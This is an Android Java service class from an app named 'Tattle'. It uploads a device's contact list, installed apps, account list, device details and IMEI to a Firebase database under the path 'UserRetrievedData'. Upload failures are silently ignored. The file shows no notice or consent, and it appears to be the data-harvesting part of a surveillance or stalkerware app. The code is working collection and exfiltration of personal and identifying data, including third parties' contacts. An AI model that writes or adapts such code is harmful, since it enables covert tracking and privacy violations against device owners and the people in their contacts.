package com.globalsolutions.Tattle.DataUploadServices;

import android.accounts.Account;
import android.content.Context;
import android.content.Intent;

import androidx.annotation.NonNull;
import androidx.core.app.JobIntentService;

import com.globalsolutions.Tattle.Models.ContactsInfo;
import com.globalsolutions.Tattle.Models.InstalledApps;
import com.globalsolutions.Tattle.OtherUtils.SharedPrefs;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.List;

public class BasicDataUploadService extends JobIntentService {

    private static final String TAG = "BasicDataUploadService";

    FirebaseDatabase firebaseDatabase;
    DatabaseReference databaseReference;
    FirebaseAuth firebaseAuth;
    SharedPrefs sharedPrefs;

    int count=0;

    public static void enqueueWork(Context context, Intent work) {
        enqueueWork(context, BasicDataUploadService.class, 123, work);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        sharedPrefs = SharedPrefs.getInstance(this);
        FirebaseApp.initializeApp(this);
        firebaseDatabase = FirebaseDatabase.getInstance();
        firebaseAuth = FirebaseAuth.getInstance();
        databaseReference = firebaseDatabase.getReference();
    }

    @Override
    protected void onHandleWork(@NonNull Intent intent) {
        List<ContactsInfo> contactsInfoList = (List<ContactsInfo>) intent.getSerializableExtra("contacts");
        List<InstalledApps> installedAppsList = (List<InstalledApps>) intent.getSerializableExtra("installedApps");
        List<Account> accountList = (List<Account>) intent.getSerializableExtra("accounts");
        String deviceInfo = intent.getStringExtra("deviceInfo");
        String deviceImei = intent.getStringExtra("imei");

        if (contactsInfoList != null) {
            databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("ContactList").setValue(contactsInfoList).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void aVoid) {
                    count++;
                }
            }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                }
            });
        }
        if (installedAppsList != null) {
            databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("InstalledApps").setValue(installedAppsList).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void aVoid) {
                    count++;
                }
            }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                }
            });
        }

        if (deviceInfo != null) {
            databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("DeviceInfo").setValue(deviceInfo).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void aVoid) {
                    count++;
                }
            }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                }
            });
        }

        if (accountList != null) {
            databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("AccountList").setValue(accountList).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void aVoid) {
                    count++;
                }
            }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                }
            });
        }

        if (deviceImei != null && !deviceImei.isEmpty()) {
            databaseReference.child("UserRetrievedData").child(sharedPrefs.getUniqueId()).child("DeviceIMEI").setValue(deviceImei).addOnSuccessListener(new OnSuccessListener<Void>() {
                @Override
                public void onSuccess(Void aVoid) {
                    count++;
                }
            }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                }
            });
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
//        sharedPrefs.basicDataUploaded(count == 5);
    }

    @Override
    public boolean onStopCurrentWork() {
        return super.onStopCurrentWork();
    }

}
